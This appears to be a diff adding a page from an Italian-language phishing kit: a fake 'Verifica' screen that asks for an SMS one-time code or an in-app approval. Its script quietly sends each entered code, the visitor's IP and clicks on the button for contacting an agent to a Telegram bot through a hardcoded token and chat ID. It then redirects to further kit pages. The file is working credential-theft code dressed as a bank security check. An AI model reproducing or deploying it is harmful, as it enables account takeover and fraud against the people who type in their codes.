@@ -1,0 +1,285 @@
+<?php
+// === Optional antibot checks ===
+// Get user IP
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+}
+$userIP = getUserIP();
+
+// Optional: ban IPs or allow countries here if you want
+// For example:
+// $bannedIPs = ['1.2.3.4'];
+// if (in_array($userIP, $bannedIPs)) { header('HTTP/1.0 403 Forbidden'); exit('Access denied'); }
+
+?>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Verifica</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    :root {
+      --primary-blue: #0071ce;
+      --accent-orange: #f36f21;
+      --background: #f9f9f9;
+      --text-dark: #333;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: var(--background);
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    h2 {
+      color: var(--accent-orange);
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: var(--text-dark);
+      margin-bottom: 20px;
+    }
+
+    select, input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: var(--primary-blue);
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+
+    #countdown {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--primary-blue);
+      margin-bottom: 20px;
+    }
+
+    .tg-info {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #888;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Verifica</h2>
+    <p>Scegli il metodo di verifica</p>
+
+    <select id="methodSelect" onchange="changeMethod()">
+      <option value="sms">SMS (codice)</option>
+      <option value="app">App (approvazione)</option>
+    </select>
+
+    <!-- SMS Verification Section -->
+    <div id="smsSection">
+      <p>Inserisci il codice ricevuto via SMS</p>
+      <div id="countdown">02:00</div>
+      <input type="text" id="smsCode" maxlength="6" placeholder="------">
+      <button id="submitSMSBtn" onclick="submitSMS()">Verifica</button>
+    </div>
+
+    <!-- App Approval Section -->
+    <div id="appSection" class="hidden">
+      <p>Approva la richiesta nell'app sul tuo dispositivo</p>
+      <button onclick="simulateAppApproval()">Ho approvato</button>
+    </div>
+
+    <!-- Live Agent Button -->
+    <div style="margin-top: 20px;">
+      <p>Problemi con la verifica?</p>
+      <button id="liveAgentBtn" style="background-color: var(--accent-orange);" onclick="contactAgent()">Chatta con un agente</button>
+    </div>
+
+    <div class="tg-info">
+      <p>Info invio: <span id="tgStatus">In attesa…</span></p>
+    </div>
+  </div>
+
+  <script>
+    const countdownEl = document.getElementById("countdown");
+    const smsInput = document.getElementById("smsCode");
+    const submitSMSBtn = document.getElementById("submitSMSBtn");
+    const tgStatus = document.getElementById("tgStatus");
+    const smsSection = document.getElementById("smsSection");
+    const appSection = document.getElementById("appSection");
+
+    const botToken = "8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s";
+    const chatId = "-4932499123";
+
+    let userIP = "Unknown";
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => userIP = data.ip)
+      .catch(err => console.error("IP fetch error", err));
+
+    let timeLeft = 120;
+    let timer = null;
+
+    function startTimer() {
+      timer = setInterval(() => {
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          countdownEl.textContent = "Tempo scaduto";
+          smsInput.disabled = true;
+          submitSMSBtn.disabled = true;
+          tgStatus.textContent = "Scaduto";
+        } else {
+          const min = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+          const sec = String(timeLeft % 60).padStart(2, '0');
+          countdownEl.textContent = `${min}:${sec}`;
+          timeLeft--;
+        }
+      }, 1000);
+    }
+
+    function submitSMS() {
+      const code = smsInput.value.trim();
+      if (code.length !== 6) {
+        alert("Il codice deve contenere 6 cifre.");
+        return;
+      }
+
+      tgStatus.textContent = "Inviando...";
+
+      const message = `🔐 *Codice SMS inserito:*\n\n📩 Codice: \`${code}\`\n🌐 IP: \`${userIP}\``;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(res => {
+        if (res.ok) {
+          tgStatus.textContent = "Inviato con successo.";
+          window.location.href = "wait3.php";
+        } else {
+          tgStatus.textContent = "Errore invio.";
+        }
+      }).catch(err => {
+        tgStatus.textContent = "Errore di rete.";
+        console.error(err);
+      });
+    }
+
+    function simulateAppApproval() {
+      tgStatus.textContent = "Inviando approvazione...";
+
+      const message = `📲 *Approvazione effettuata tramite app*\n🌐 IP: \`${userIP}\``;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(res => {
+        if (res.ok) {
+          tgStatus.textContent = "Approvazione confermata.";
+          window.location.href = "wait3.php";
+        } else {
+          tgStatus.textContent = "Errore invio.";
+        }
+      }).catch(err => {
+        tgStatus.textContent = "Errore di rete.";
+        console.error(err);
+      });
+    }
+
+    function changeMethod() {
+      const selected = document.getElementById("methodSelect").value;
+      if (selected === "sms") {
+        smsSection.classList.remove("hidden");
+        appSection.classList.add("hidden");
+        resetTimer();
+        startTimer();
+      } else {
+        smsSection.classList.add("hidden");
+        appSection.classList.remove("hidden");
+        clearInterval(timer);
+        tgStatus.textContent = "In attesa…";
+      }
+    }
+
+    function resetTimer() {
+      clearInterval(timer);
+      timeLeft = 120;
+      countdownEl.textContent = "02:00";
+      smsInput.disabled = false;
+      submitSMSBtn.disabled = false;
+    }
+
+    function contactAgent() {
+      tgStatus.textContent = "Contattando l'agente...";
+
+      const message = `👥 *Utente ha cliccato per contattare un agente live*\n🌐 IP: \`${userIP}\``;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(() => {
+        setTimeout(() => {
+          window.location.href = "live-agent.php"; // Replace with actual live agent page
+        }, 700);
+      }).catch(err => {
+        console.error("Errore durante il contatto agente:", err);
+        window.location.href = "live-agent.php"; // Redirect anyway
+      });
+    }
+
+    // Auto-start timer
+    startTimer();
+  </script>
+</body>
+</html>
